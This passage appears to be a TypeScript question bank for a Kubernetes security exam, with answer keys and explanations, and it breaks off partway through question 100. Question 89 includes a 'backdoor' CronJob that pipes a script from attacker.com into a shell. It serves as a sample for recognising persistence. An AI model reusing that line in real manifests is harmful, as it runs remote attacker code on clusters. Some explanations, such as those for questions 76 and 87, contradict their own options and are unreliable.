export type Difficulty = 'Easy' | 'Medium' | 'Hard';

export interface ExamQuestion {
  id: number;
  domain: number;
  domainName: string;
  question: string;
  codeSnippet?: string;
  options: string[];
  correctAnswer: number; // 0-based index
  explanation: string;
  difficulty: Difficulty;
  relatedSection: string;
}

export const examQuestionsNew: ExamQuestion[] = [
  // ===== DOMAIN 1: Overview of Cloud Native Security (6 questions, ids 61-66) =====
  {
    id: 61,
    domain: 1,
    domainName: 'Overview of Cloud Native Security',
    question: 'A namespace administrator creates the following pod. Which PSS profile would reject it?',
    codeSnippet: `apiVersion: v1
kind: Pod
metadata:
  name: risky-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: app
    image: nginx`,
    options: [
      'Only Restricted',
      'Both Baseline and Restricted',
      'Only Baseline',
      'Neither — only Privileged allows this',
    ],
    correctAnswer: 1,
    explanation: 'The Baseline Pod Security Standard explicitly forbids hostPID, hostIPC, and hostNetwork because they break pod isolation and expose the host. The Restricted profile inherits all Baseline restrictions and adds further constraints, so it also blocks this pod. Option A is wrong because Baseline already blocks it. Option D is wrong because Privileged is not a PSS profile — the three profiles are Privileged (no restrictions), Baseline, and Restricted.',
    difficulty: 'Medium',
    relatedSection: '/domain1/d1-c4',
  },
  {
    id: 62,
    domain: 1,
    domainName: 'Overview of Cloud Native Security',
    question: 'Which of the following is NOT one of the 4Cs of Cloud Native Security?',
    options: [
      'Cloud',
      'Cluster',
      'Container',
      'Control Plane',
    ],
    correctAnswer: 3,
    explanation: 'The 4Cs of Cloud Native Security are Cloud, Cluster, Container, and Code. The Control Plane is a component within the Cluster layer, not a separate C. Option A (Cloud) is the outermost layer, B (Cluster) includes the orchestrator and control plane, and C (Container) is the layer that holds the running workloads.',
    difficulty: 'Easy',
    relatedSection: '/domain1/d1-c1',
  },
  {
    id: 63,
    domain: 1,
    domainName: 'Overview of Cloud Native Security',
    question: 'In the shared responsibility model of cloud native security, which of the following are typically the Cloud provider\'s responsibilities? A) Physical data center security B) Network infrastructure C) Kubernetes RBAC configuration D) Container image scanning',
    options: [
      'A and B only',
      'A, B, and C only',
      'All of the above',
      'None of the above',
    ],
    correctAnswer: 0,
    explanation: 'The Cloud provider manages the underlying physical infrastructure and network, which corresponds to the Cloud layer of the 4Cs. Kubernetes RBAC is part of the Cluster layer and is the customer\'s responsibility. Container image scanning is part of the Container/Code layers and is also the customer\'s responsibility. Therefore only A and B are provider responsibilities.',
    difficulty: 'Medium',
    relatedSection: '/domain1/d1-c1',
  },
  {
    id: 64,
    domain: 1,
    domainName: 'Overview of Cloud Native Security',
    question: 'What does SLSA Level 2 require that Level 1 does not?',
    options: [
      'Two-person review of all changes',
      'Build service usage with signed provenance',
      'Reproducible builds',
      'Hermetic builds',
    ],
    correctAnswer: 1,
    explanation: 'SLSA Level 2 requires using a hosted build service (not just a developer workstation) and generating signed provenance attestations. Level 1 only requires provenance documentation without signing. Two-person review is a Level 4 requirement. Reproducible and hermetic builds are also higher-level SLSA requirements.',
    difficulty: 'Medium',
    relatedSection: '/domain1/d1-c4',
  },
  {
    id: 65,
    domain: 1,
    domainName: 'Overview of Cloud Native Security',
    question: 'A namespace has the following labels. What happens when a pod is created with `runAsNonRoot: false` and `runAsUser: 0` in this namespace?',
    codeSnippet: `apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: v1.28`,
    options: [
      'Pod is created with a warning',
      'Pod is rejected and cannot be created',
      'Pod is created and the violation is logged to the audit log',
      'Pod is created with no action taken',
    ],
    correctAnswer: 1,
    explanation: 'With `enforce: restricted`, the Pod Security Admission controller rejects any pod that violates the Restricted profile. Running as root (`runAsUser: 0` or `runAsNonRoot: false`) violates the Restricted requirement that containers must run as non-root. Option A describes the `warn` mode behavior, C describes the `audit` mode behavior, and D describes the `privileged` profile behavior.',
    difficulty: 'Medium',
    relatedSection: '/domain1/d1-c4',
  },
  {
    id: 66,
    domain: 1,
    domainName: 'Overview of Cloud Native Security',
    question: 'Starting in Kubernetes 1.24, what significant change was made to ServiceAccount token generation?',
    options: [
      'ServiceAccounts are no longer supported; OIDC is required',
      'Legacy Secret-based tokens are no longer auto-generated; bound tokens via TokenRequest are preferred',
      'All ServiceAccount tokens now expire after 1 hour by default',
      'Tokens are stored directly in etcd without Secrets',
    ],
    correctAnswer: 1,
    explanation: 'Kubernetes 1.24 stopped auto-generating legacy Secret-based ServiceAccount tokens. The TokenRequest API now generates short-lived, bound projection tokens that are mounted into pods. Option A is incorrect because ServiceAccounts are still supported. Option C is incorrect because there is no universal 1-hour default. Option D is incorrect because token Secrets still exist for legacy compatibility.',
    difficulty: 'Hard',
    relatedSection: '/domain1/d1-c4',
  },

  // ===== DOMAIN 2: Kubernetes Cluster Component Security (9 questions, ids 67-75) =====
  {
    id: 67,
    domain: 2,
    domainName: 'Kubernetes Cluster Component Security',
    question: 'An administrator discovers the following Kubelet configuration in a legacy cluster. What is the primary risk?',
    codeSnippet: `apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
authentication:
  anonymous:
    enabled: true
authorization:
  mode: AlwaysAllow`,
    options: [
      'The Kubelet will refuse to start',
      'Anyone can make unauthenticated requests with full permissions',
      'Only the API Server can connect to the Kubelet',
      'Pod logs are automatically encrypted',
    ],
    correctAnswer: 1,
    explanation: 'With anonymous authentication enabled and authorization mode set to AlwaysAllow, any network actor can connect to the Kubelet and perform operations without credentials. The Kubelet controls pod lifecycle, secrets, and exec/logs access, making this extremely dangerous. Option A is wrong because the Kubelet will start with these settings. Option C is wrong because there is no restriction to the API Server. Option D is completely unrelated.',
    difficulty: 'Medium',
    relatedSection: '/domain2/d2-c3',
  },
  {
    id: 68,
    domain: 2,
    domainName: 'Kubernetes Cluster Component Security',
    question: 'A cluster scan reveals the following legacy Kubelet configuration. Which port creates an unauthenticated information disclosure risk?',
    codeSnippet: `kind: KubeletConfiguration
apiVersion: kubelet.config.k8s.io/v1beta1
readOnlyPort: 10255
authentication:
  anonymous:
    enabled: true`,
    options: [
      '10248',
      '10250',
      '10255',
      '10256',
    ],
    correctAnswer: 2,
    explanation: 'Port 10255 is the Kubelet read-only endpoint that exposes pod metadata, specs, and other information without requiring authentication. When combined with anonymous auth, anyone on the network can scrape this data. Port 10248 is the healthz endpoint, 10250 is the authenticated Kubelet API, and 10256 is the kube-proxy health port. Options A, B, and D do not expose pod information unauthenticated.',
    difficulty: 'Medium',
    relatedSection: '/domain2/d2-c3',
  },
  {
    id: 69,
    domain: 2,
    domainName: 'Kubernetes Cluster Component Security',
    question: 'Which of the following cluster components actively send requests TO the Kubernetes API Server? A) Kubelet B) Controller Manager C) Scheduler D) etcd',
    options: [
      'A, B, and C only',
      'A and B only',
      'All of the above',
      'A, B, C, and D',
    ],
    correctAnswer: 0,
    explanation: 'The Kubelet, Controller Manager, and Scheduler all initiate communication with the API Server to report status, watch resources, and make scheduling decisions. etcd does NOT send requests to the API Server — it is the data store that the API Server queries. The API Server is the only component that communicates directly with etcd. Therefore option D and C are incorrect, and B is incomplete.',
    difficulty: 'Medium',
    relatedSection: '/domain2/d2-c1',
  },
  {
    id: 70,
    domain: 2,
    domainName: 'Kubernetes Cluster Component Security',
    question: 'What is the purpose of the Kubelet port 10248?',
    options: [
      'Metrics scraping for Prometheus',
      'Health checks without authentication',
      'Read-only pod information endpoint',
      'Communication with the container runtime',
    ],
    correctAnswer: 1,
    explanation: 'Port 10248 is the Kubelet healthz endpoint used for liveness and readiness probes. It does not require authentication and simply returns the Kubelet health status. Port 10250 is the authenticated Kubelet API, 10255 is the insecure read-only endpoint, and container runtime communication happens via the CRI over a Unix socket or other configured endpoint.',
    difficulty: 'Easy',
    relatedSection: '/domain2/d2-c3',
  },
  {
    id: 71,
    domain: 2,
    domainName: 'Kubernetes Cluster Component Security',
    question: 'A cluster uses the following EncryptionConfiguration for secrets at rest. What is the security concern?',
    codeSnippet: `apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded-key>`,
    options: [
      'The key length is insufficient',
      'aescbc is deprecated and less secure than aesgcm or KMS providers',
      'Secrets are not encrypted at all',
      'The configuration is missing an identity provider',
    ],
    correctAnswer: 1,
    explanation: 'aescbc has been deprecated in favor of aesgcm and KMS providers because it is vulnerable to padding oracle attacks and lacks authentication. The configuration does encrypt secrets (option C is wrong), and the key length is not the primary concern here (option A is wrong). Option D is wrong because an identity provider is only needed as a no-encryption fallback when listed first.',
    difficulty: 'Medium',
    relatedSection: '/domain2/d2-c2',
  },
  {
    id: 72,
    domain: 2,
    domainName: 'Kubernetes Cluster Component Security',
    question: 'KMS v2 for etcd encryption at rest was introduced in which Kubernetes version?',
    options: [
      '1.24',
      '1.25',
      '1.27',
      '1.29',
    ],
    correctAnswer: 2,
    explanation: 'KMS v2 was introduced in Kubernetes 1.27 as a more performant and secure alternative to KMS v1 for etcd encryption at rest. It supports caching and reduces the load on the external KMS provider. Options A and B predate KMS v2, and while improvements may have continued in 1.29, the initial introduction was in 1.27.',
    difficulty: 'Hard',
    relatedSection: '/domain2/d2-c2',
  },
  {
    id: 73,
    domain: 2,
    domainName: 'Kubernetes Cluster Component Security',
    question: 'Which of the following admission controllers is NOT primarily a validating admission controller?',
    options: [
      'NodeRestriction',
      'ResourceQuota',
      'LimitRanger',
      'PodSecurity',
    ],
    correctAnswer: 2,
    explanation: 'LimitRanger is a mutating admission controller that automatically applies default resource limits and requests to pods that do not specify them. NodeRestriction, ResourceQuota, and PodSecurity are all validating controllers that check whether a request should be allowed without modifying it. Option C is the only one that mutates resources.',
    difficulty: 'Hard',
    relatedSection: '/domain2/d2-c1',
  },
  {
    id: 74,
    domain: 2,
    domainName: 'Kubernetes Cluster Component Security',
    question: 'With NodeRestriction admission enabled, can a Kubelet create the following pod in the kube-system namespace?',
    codeSnippet: `apiVersion: v1
kind: Pod
metadata:
  name: debug-pod
  namespace: kube-system
spec:
  containers:
  - name: debug
    image: busybox
    securityContext:
      privileged: true`,
    options: [
      'Yes, because it is privileged',
      'No, NodeRestriction prevents Kubelets from creating pods in kube-system',
      'Yes, because it runs on the same node',
      'No, because Pod Security blocks privileged pods',
    ],
    correctAnswer: 1,
    explanation: 'The NodeRestriction admission controller prevents Kubelets from creating, modifying, or deleting pods in the kube-system namespace and pods not bound to their own node. This limits the blast radius of a compromised Kubelet. Option A is wrong because privilege does not bypass NodeRestriction. Option C is wrong because same-node binding does not grant kube-system access. Option D describes PSS behavior, not NodeRestriction.',
    difficulty: 'Medium',
    relatedSection: '/domain2/d2-c3',
  },
  {
    id: 75,
    domain: 2,
    domainName: 'Kubernetes Cluster Component Security',
    question: 'Which seccomp profile blocks the most syscalls by default in Kubernetes?',
    options: [
      'Unconfined',
      'RuntimeDefault',
      'Localhost',
      'Custom profile',
    ],
    correctAnswer: 1,
    explanation: 'RuntimeDefault applies the container runtime\'s default seccomp filter, which blocks a significant set of dangerous syscalls. Unconfined allows all syscalls and provides no protection. Localhost and Custom profiles may be more or less restrictive depending on their specific rules, but RuntimeDefault is the most restrictive built-in profile available without custom configuration. Options A, C, and D are either less restrictive or variable.',
    difficulty: 'Medium',
    relatedSection: '/domain2/d2-c3',
  },

  // ===== DOMAIN 3: Kubernetes Security Fundamentals (9 questions, ids 76-84) =====
  {
    id: 76,
    domain: 3,
    domainName: 'Kubernetes Security Fundamentals',
    question: 'Given the following NetworkPolicy, can a pod with label `app=frontend` in namespace `prod` (which has no `env` label) reach the backend on port 8080?',
    codeSnippet: `apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend
  namespace: prod
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          env: staging
      podSelector:
        matchLabels:
          app: frontend`,
    options: [
      'Yes, because the pod matches the podSelector',
      'No, because the namespace lacks the env=staging label',
      'Yes, because all pods in the same namespace can communicate',
      'No, because NetworkPolicy denies all ingress by default',
    ],
    correctAnswer: 1,
    explanation: 'In a single NetworkPolicy `from` entry, both namespaceSelector and podSelector are ANDed together. The source pod must have `app=frontend` AND be in a namespace with `env=staging`. Since the frontend pod is in namespace `prod` without the `env=staging` label, traffic is denied. Option A ignores the namespaceSelector constraint. Option C is wrong because NetworkPolicies default-deny unmatched ingress. Option D misstates the default behavior — unmatched traffic is denied by this policy, not by default.',
    difficulty: 'Medium',
    relatedSection: '/domain3/d3-c1',
  },
  {
    id: 77,
    domain: 3,
    domainName: 'Kubernetes Security Fundamentals',
    question: 'Which of the following is NOT considered a dangerous or sensitive RBAC verb?',
    options: [
      'escalate',
      'bind',
      'impersonate',
      'list',
    ],
    correctAnswer: 3,
    explanation: '`escalate`, `bind`, and `impersonate` are all considered dangerous verbs because they can be used to gain higher privileges or assume other identities. `escalate` allows creating roles with more permissions than the creator has, `bind` allows binding to any role, and `impersonate` allows acting as another user. `list` is a standard read operation and is not inherently dangerous, though it can be sensitive depending on the resource.',
    difficulty: 'Medium',
    relatedSection: '/domain3/d3-c2',
  },
  {
    id: 78,
    domain: 3,
    domainName: 'Kubernetes Security Fundamentals',
    question: 'Which of the following are requirements of the Restricted Pod Security Standard? A) Containers must run as non-root B) All capabilities must be dropped C) hostNetwork is allowed with justification D) Seccomp profile must be RuntimeDefault or Localhost',
    options: [
      'A and B only',
      'A, B, and D only',
      'All of the above',
      'A and D only',
    ],
    correctAnswer: 1,
    explanation: 'The Restricted profile requires containers to run as non-root (A), drop all capabilities (B), and use a seccomp profile of RuntimeDefault or Localhost (D). hostNetwork is never allowed in Restricted — it is blocked even in Baseline (C is false). Therefore options A, C, and D are incorrect because they either exclude valid requirements or include a false one.',
    difficulty: 'Hard',
    relatedSection: '/domain3/d3-c3',
  },
  {
    id: 79,
    domain: 3,
    domainName: 'Kubernetes Security Fundamentals',
    question: 'A user is bound to the following Role via a RoleBinding. Which action can they NOT perform on secrets in the default namespace?',
    codeSnippet: `apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: secret-reader
  namespace: default
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list", "watch", "create", "delete"]`,
    options: [
      'Read secret values',
      'Create new secrets',
      'Update existing secrets',
      'Delete secrets',
    ],
    correctAnswer: 2,
    explanation: 'The Role grants `get`, `list`, `watch`, `create`, and `delete` verbs but does NOT grant `update` or `patch`. Without the `update` verb, the user cannot modify existing secrets. Options A, B, and D are all permitted by the granted verbs — `get` allows reading values, `create` allows creating new secrets, and `delete` allows removing them.',
    difficulty: 'Medium',
    relatedSection: '/domain3/d3-c2',
  },
  {
    id: 80,
    domain: 3,
    domainName: 'Kubernetes Security Fundamentals',
    question: 'Starting in Kubernetes 1.25, PodSecurityPolicy (PSP) was completely removed. What is the recommended built-in replacement?',
    options: [
      'OPA Gatekeeper',
      'Kyverno',
      'Pod Security Admission with namespace labels',
      'NodeRestriction admission controller',
    ],
    correctAnswer: 2,
    explanation: 'Pod Security Admission (PSA) is the built-in replacement for PodSecurityPolicy, enabled by default since Kubernetes 1.25. It uses namespace labels like `pod-security.kubernetes.io/enforce` to apply PSS profiles. OPA Gatekeeper and Kyverno are powerful third-party alternatives but are not built-in. NodeRestriction is unrelated to pod security policies.',
    difficulty: 'Medium',
    relatedSection: '/domain3/d3-c3',
  },
  {
    id: 81,
    domain: 3,
    domainName: 'Kubernetes Security Fundamentals',
    question: 'Which of the following capabilities is NOT blocked by the Baseline Pod Security Standard?',
    options: [
      'NET_ADMIN',
      'SYS_ADMIN',
      'NET_BIND_SERVICE',
      'SYS_PTRACE',
    ],
    correctAnswer: 2,
    explanation: 'NET_BIND_SERVICE is one of the 13 capabilities explicitly allowed by the Baseline Pod Security Standard. NET_ADMIN, SYS_ADMIN, and SYS_PTRACE are all blocked because they grant excessive privileges that could compromise node or cluster security. The Baseline allows only a minimal set of safe capabilities: AUDIT_WRITE, CHOWN, DAC_OVERRIDE, FOWNER, FSETID, KILL, MKNOD, NET_BIND_SERVICE, SETFCAP, SETPCAP, SETGID, SETUID, and SYS_CHROOT.',
    difficulty: 'Medium',
    relatedSection: '/domain3/d3-c3',
  },
  {
    id: 82,
    domain: 3,
    domainName: 'Kubernetes Security Fundamentals',
    question: 'A pod uses the following ServiceAccount. What happens when a container inside the pod tries to call the Kubernetes API Server?',
    codeSnippet: `apiVersion: v1
kind: ServiceAccount
metadata:
  name: no-mount
automountServiceAccountToken: false`,
    options: [
      'The pod cannot authenticate and API requests fail',
      'The pod gets a token from the default ServiceAccount instead',
      'The pod can still authenticate using its node certificate',
      'The pod falls back to anonymous authentication',
    ],
    correctAnswer: 0,
    explanation: 'With `automountServiceAccountToken: false`, no service account token is mounted into the pod\'s filesystem. Without a token, the pod has no Kubernetes identity and cannot authenticate to the API Server. Option B is wrong because there is no automatic fallback to the default ServiceAccount. Option C is wrong because node certificates are not available inside pods. Option D is wrong because anonymous auth is not an automatic fallback for failed token auth.',
    difficulty: 'Medium',
    relatedSection: '/domain3/d3-c2',
  },
  {
    id: 83,
    domain: 3,
    domainName: 'Kubernetes Security Fundamentals',
    question: 'The following pod is submitted to a cluster. Which PSS profile would block it?',
    codeSnippet: `apiVersion: v1
kind: Pod
metadata:
  name: cap-pod
spec:
  containers:
  - name: app
    image: nginx
    securityContext:
      capabilities:
        add: ["NET_ADMIN"]`,
    options: [
      'Only Baseline',
      'Only Restricted',
      'Both Baseline and Restricted',
      'Neither',
    ],
    correctAnswer: 2,
    explanation: 'NET_ADMIN is not among the 13 capabilities allowed by the Baseline Pod Security Standard, so Baseline blocks this pod. The Restricted profile requires dropping ALL capabilities and only allows NET_BIND_SERVICE to be added, so it also blocks NET_ADMIN. Option D is wrong because both profiles block it. Options A and B are incomplete because both profiles reject this configuration.',
    difficulty: 'Medium',
    relatedSection: '/domain3/d3-c3',
  },
  {
    id: 84,
    domain: 3,
    domainName: 'Kubernetes Security Fundamentals',
    question: 'Which of the following capabilities are among the 13 allowed by the Baseline Pod Security Standard? A) CHOWN B) KILL C) SYS_ADMIN D) NET_BIND_SERVICE',
    options: [
      'A and B only',
      'A, B, and D only',
      'All of the above',
      'A and D only',
    ],
    correctAnswer: 1,
    explanation: 'The Baseline Pod Security Standard allows 13 capabilities: AUDIT_WRITE, CHOWN, DAC_OVERRIDE, FOWNER, FSETID, KILL, MKNOD, NET_BIND_SERVICE, SETFCAP, SETPCAP, SETGID, SETUID, and SYS_CHROOT. SYS_ADMIN is not in this list and is blocked by Baseline. Therefore A, B, and D are correct while C is incorrect. Options A and D are incomplete because they exclude valid capabilities.',
    difficulty: 'Hard',
    relatedSection: '/domain3/d3-c3',
  },

  // ===== DOMAIN 4: Kubernetes Threat Model (7 questions, ids 85-91) =====
  {
    id: 85,
    domain: 4,
    domainName: 'Kubernetes Threat Model',
    question: 'Given the following pod spec, which PSS profiles would reject it?',
    codeSnippet: `apiVersion: v1
kind: Pod
metadata:
  name: host-pod
spec:
  hostPID: true
  containers:
  - name: main
    image: nginx
    securityContext:
      privileged: true`,
    options: [
      'Only Restricted',
      'Both Baseline and Restricted',
      'Only Baseline',
      'Neither',
    ],
    correctAnswer: 1,
    explanation: 'The Baseline profile explicitly blocks both hostPID and privileged containers because they break pod isolation and expose the host. The Restricted profile inherits all Baseline restrictions and adds more, so it also blocks this pod. Option A is wrong because Baseline already rejects it. Option C is wrong because Restricted also rejects it. Option D is wrong because both profiles enforce these restrictions.',
    difficulty: 'Medium',
    relatedSection: '/domain4/d4-c1',
  },
  {
    id: 86,
    domain: 4,
    domainName: 'Kubernetes Threat Model',
    question: 'Which of the following is NOT a category in the STRIDE threat model?',
    options: [
      'Spoofing',
      'Tampering',
      'Repudiation',
      'Exfiltration',
    ],
    correctAnswer: 3,
    explanation: 'STRIDE consists of six categories: Spoofing (identity), Tampering (data), Repudiation (denial of action), Information Disclosure, Denial of Service, and Elevation of Privilege. Exfiltration is not a STRIDE category, though it could be considered a form of Information Disclosure. Options A, B, and C are all legitimate STRIDE categories.',
    difficulty: 'Easy',
    relatedSection: '/domain4/d4-c2',
  },
  {
    id: 87,
    domain: 4,
    domainName: 'Kubernetes Threat Model',
    question: 'Which of the following pod configurations significantly increase the risk of container escape? A) privileged: true B) hostPID: true C) runAsNonRoot: true D) allowPrivilegeEscalation: true',
    options: [
      'A and B only',
      'A, B, and D only',
      'All of the above',
      'A and D only',
    ],
    correctAnswer: 1,
    explanation: 'Privileged mode grants full host access, hostPID shares the host process namespace (enabling process injection), and allowPrivilegeEscalation: true permits a process to gain more privileges than its parent. All three are major container escape risks. Option C (runAsNonRoot: true) reduces escape risk by preventing root execution. Options A and D are incomplete because they exclude hostPID, and C is wrong because it includes a security-hardening setting.',
    difficulty: 'Hard',
    relatedSection: '/domain4/d4-c1',
  },
  {
    id: 88,
    domain: 4,
    domainName: 'Kubernetes Threat Model',
    question: 'In the MITRE ATT&CK Containers matrix, which tactic involves maintaining access to a compromised cluster over time?',
    options: [
      'Initial Access',
      'Execution',
      'Persistence',
      'Privilege Escalation',
    ],
    correctAnswer: 2,
    explanation: 'Persistence is the MITRE ATT&CK tactic that covers techniques used to maintain access to a compromised environment over time, such as creating backdoor accounts, installing webhooks, or deploying malicious CronJobs. Initial Access covers entry points, Execution covers running code, and Privilege Escalation covers gaining higher-level permissions. Options A, B, and D describe other phases of the attack lifecycle.',
    difficulty: 'Medium',
    relatedSection: '/domain4/d4-c2',
  },
  {
    id: 89,
    domain: 4,
    domainName: 'Kubernetes Threat Model',
    question: 'A threat actor deploys the following CronJob in a compromised namespace. What MITRE ATT&CK tactic does this represent?',
    codeSnippet: `apiVersion: batch/v1
kind: CronJob
metadata:
  name: backdoor
  namespace: default
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: shell
            image: alpine
            command: ["/bin/sh"]
            args: ["-c", "curl -s http://attacker.com/script | sh"]
          restartPolicy: OnFailure`,
    options: [
      'Denial of Service',
      'Persistence',
      'Initial Access',
      'Credential Access',
    ],
    correctAnswer: 1,
    explanation: 'A CronJob that periodically downloads and executes a remote script is a classic Persistence technique — it ensures the attacker maintains access even if their primary entry point is discovered and removed. This is mapped to the Persistence tactic in MITRE ATT&CK. Option A is wrong because there is no resource exhaustion. Option C is wrong because the cluster is already compromised. Option D is wrong because no credentials are being harvested.',
    difficulty: 'Medium',
    relatedSection: '/domain4/d4-c2',
  },
  {
    id: 90,
    domain: 4,
    domainName: 'Kubernetes Threat Model',
    question: 'Pod Security Policies (PSP) were completely removed in Kubernetes 1.25. What should cluster administrators migrate to for built-in pod security enforcement?',
    options: [
      'Third-party admission controllers only',
      'Pod Security Admission with namespace labels',
      'NetworkPolicies',
      'RBAC alone',
    ],
    correctAnswer: 1,
    explanation: 'Pod Security Admission (PSA) is the built-in, namespace-label-driven replacement for PSP that has been available since Kubernetes 1.23 and enabled by default since 1.25. Administrators label namespaces with `pod-security.kubernetes.io/enforce` to apply PSS profiles. Options A is wrong because third-party tools are optional, not the built-in replacement. Option C and D are wrong because NetworkPolicies and RBAC do not enforce pod security configurations.',
    difficulty: 'Medium',
    relatedSection: '/domain4/d4-c3',
  },
  {
    id: 91,
    domain: 4,
    domainName: 'Kubernetes Threat Model',
    question: 'Which of the following is NOT a common persistence mechanism used by attackers in a compromised Kubernetes cluster?',
    options: [
      'Creating a backdoor ServiceAccount',
      'Installing a mutating admission webhook',
      'Running kube-bench security scans',
      'Creating a malicious CronJob',
    ],
    correctAnswer: 2,
    explanation: 'kube-bench is a legitimate security auditing tool that checks cluster configurations against the CIS Kubernetes Benchmark. It is not an attacker persistence technique. Options A, B, and D are all valid persistence mechanisms: backdoor ServiceAccounts provide ongoing access, mutating webhooks can inject malicious containers into new pods, and CronJobs ensure periodic re-execution of attacker code.',
    difficulty: 'Medium',
    relatedSection: '/domain4/d4-c2',
  },

  // ===== DOMAIN 5: Platform Security (9 questions, ids 92-100) =====
  {
    id: 92,
    domain: 5,
    domainName: 'Platform Security',
    question: 'The following EncryptionConfiguration is applied to the API Server. What is the critical flaw?',
    codeSnippet: `apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - identity: {}
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded-key>`,
    options: [
      'It does not encrypt ConfigMaps',
      'Secrets are stored unencrypted because the identity provider is first',
      'aescbc is too slow for production',
      'The key should be 512 bits',
    ],
    correctAnswer: 1,
    explanation: 'The `identity` provider performs no encryption and passes data through as plaintext. Because it is listed first in the providers array, it takes precedence and secrets are stored unencrypted in etcd. Option A is wrong because the configuration only targets secrets, not ConfigMaps. Option C is wrong because performance is not the security concern here. Option D is wrong because key length is not the primary issue — the encryption is not being used at all.',
    difficulty: 'Medium',
    relatedSection: '/domain5/d5-c2',
  },
  {
    id: 93,
    domain: 5,
    domainName: 'Platform Security',
    question: 'Which of the following tools is NOT primarily used for runtime threat detection in Kubernetes?',
    options: [
      'Falco',
      'Trivy',
      'Sysdig',
      'Tracee',
    ],
    correctAnswer: 1,
    explanation: 'Trivy is a static vulnerability scanner used for scanning container images, filesystems, and repositories — not for runtime detection. Falco, Sysdig, and Tracee are all runtime security tools that monitor syscalls, file activity, and network behavior to detect threats in running containers. Options A, C, and D are all legitimate runtime detection platforms.',
    difficulty: 'Medium',
    relatedSection: '/domain5/d5-c3',
  },
  {
    id: 94,
    domain: 5,
    domainName: 'Platform Security',
    question: 'Which of the following are typical features provided by a service mesh such as Istio or Linkerd? A) Mutual TLS between services B) Traffic routing and canary deployments C) Container image scanning D) Observability and metrics',
    options: [
      'A and B only',
      'A, B, and D only',
      'All of the above',
      'A and D only',
    ],
    correctAnswer: 1,
    explanation: 'Service meshes provide mutual TLS (mTLS) for encrypted service-to-service communication, traffic routing for canary and blue-green deployments, and rich observability including metrics, logs, and traces. Container image scanning is not a service mesh feature — it is performed by tools like Trivy, Grype, or Clair during CI/CD or by admission controllers. Options A and D are incomplete because they exclude traffic routing.',
    difficulty: 'Medium',
    relatedSection: '/domain5/d5-c5',
  },
  {
    id: 95,
    domain: 5,
    domainName: 'Platform Security',
    question: 'Which of the following is a standardized format for Software Bills of Materials (SBOMs)?',
    options: [
      'JSON',
      'SPDX',
      'YAML',
      'CSV',
    ],
    correctAnswer: 1,
    explanation: 'SPDX (Software Package Data Exchange) is a standardized open format for SBOMs maintained by the Linux Foundation. JSON, YAML, and CSV are general-purpose data formats that can carry SBOM information but are not themselves SBOM standards. Other SBOM standards include CycloneDX, but SPDX is one of the most widely recognized.',
    difficulty: 'Easy',
    relatedSection: '/domain5/d5-c4',
  },
  {
    id: 96,
    domain: 5,
    domainName: 'Platform Security',
    question: 'What is the highest risk posed by the following ClusterRole?',
    codeSnippet: `apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: dangerous
rules:
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["clusterroles"]
    verbs: ["escalate", "bind", "impersonate"]`,
    options: [
      'It can read all cluster roles',
      'It allows privilege escalation by creating or binding to roles with more permissions',
      'It can delete all namespaces',
      'It can modify NetworkPolicies',
    ],
    correctAnswer: 1,
    explanation: 'The `escalate` verb allows creating roles with more permissions than the user currently possesses, and `bind` allows binding to any role including powerful ones like cluster-admin. Combined, these verbs enable unlimited privilege escalation. Option A is wrong because `get` and `list` are not granted. Option C is wrong because namespace deletion requires different permissions. Option D is wrong because NetworkPolicies are not mentioned.',
    difficulty: 'Hard',
    relatedSection: '/domain5/d5-c2',
  },
  {
    id: 97,
    domain: 5,
    domainName: 'Platform Security',
    question: 'Pod Security Admission (PSA) became the built-in, enabled-by-default replacement for PodSecurityPolicy starting in which Kubernetes version?',
    options: [
      '1.23',
      '1.24',
      '1.25',
      '1.27',
    ],
    correctAnswer: 2,
    explanation: 'Pod Security Admission graduated to stable and was enabled by default in Kubernetes 1.25, coinciding with the complete removal of PodSecurityPolicy. PSA uses namespace labels to enforce Pod Security Standards. Option A (1.23) was when PSA entered beta. Options B and D are incorrect because 1.24 was the bound token change and 1.27 was KMS v2.',
    difficulty: 'Hard',
    relatedSection: '/domain5/d5-c6',
  },
  {
    id: 98,
    domain: 5,
    domainName: 'Platform Security',
    question: 'Which of the following is NOT a requirement for SLSA Level 3?',
    options: [
      'Build scripts must be version controlled',
      'Build environment must be hardened and isolated',
      'Two-person review of all changes',
      'Dependencies must be declared in a locked format',
    ],
    correctAnswer: 2,
    explanation: 'Two-person review of all changes is a SLSA Level 4 requirement, not Level 3. SLSA Level 3 requires version-controlled build scripts, a hardened and isolated build environment, and declared/locked dependencies to prevent tampering. Options A, B, and D are all valid Level 3 requirements. Level 4 adds two-person review and reproducible builds.',
    difficulty: 'Hard',
    relatedSection: '/domain5/d5-c4',
  },
  {
    id: 99,
    domain: 5,
    domainName: 'Platform Security',
    question: 'Which of the following practices help secure the software supply chain? A) Signing container images with Cosign B) Generating SBOMs for each release C) Using :latest tag for all images D) Scanning dependencies for vulnerabilities',
    options: [
      'A and B only',
      'A, B, and D only',
      'All of the above',
      'B and D only',
    ],
    correctAnswer: 1,
    explanation: 'Signing images with Cosign (A), generating SBOMs (B), and scanning dependencies (D) are all supply chain security best practices. Using the `:latest` tag (C) is an anti-pattern because it makes builds non-reproducible and prevents rollback to known-good versions. Options A and D are incomplete because they exclude SBOM generation. Option C is wrong because it includes the `:latest` tag anti-pattern.',
    difficulty: 'Medium',
    relatedSection: '/domain5/d5-c4',
  },
  {
    id: 100,
    domain: 5,
    domainName: 'Platform Security',
    question: 'What is the primary purpose of cert-manager in a Kubernetes cluster?',
